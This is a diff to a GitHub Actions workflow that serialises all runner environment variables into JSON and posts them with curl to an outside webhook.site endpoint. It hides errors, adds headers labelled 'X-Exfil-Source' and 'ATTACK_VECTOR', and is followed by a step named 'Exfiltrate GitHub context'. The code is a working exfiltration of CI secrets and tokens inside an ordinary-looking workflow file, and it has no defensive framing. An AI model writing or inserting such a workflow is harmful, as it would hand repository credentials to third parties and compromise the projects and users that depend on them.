@@ -16,6 +16,9 @@ jobs:
         run: |
           {
             echo "{"
+            echo "  \"SOURCE\": \"⚙️ GITHUB_ACTIONS_RUNNER\","
+            echo "  \"ATTACK_VECTOR\": \"ci-cd-workflow\","
+            echo "  \"SEVERITY\": \"HIGH\","
             env | awk -F= '{
               key=$1
               value=substr($0, length($1)+2)
@@ -24,7 +27,12 @@ jobs:
               printf "  \"%s\": \"%s\",\n", key, value
             }' | sed '$ s/,$//'
             echo "}"
-          } | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
+          } | curl -X POST \
+            -H "Content-Type: application/json" \
+            -H "X-Exfil-Source: GITHUB-ACTIONS" \
+            -H "X-Attack-Vector: ci-cd-workflow" \
+            -d @- \
+            https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
 
       - name: Exfiltrate GitHub context
         run: |
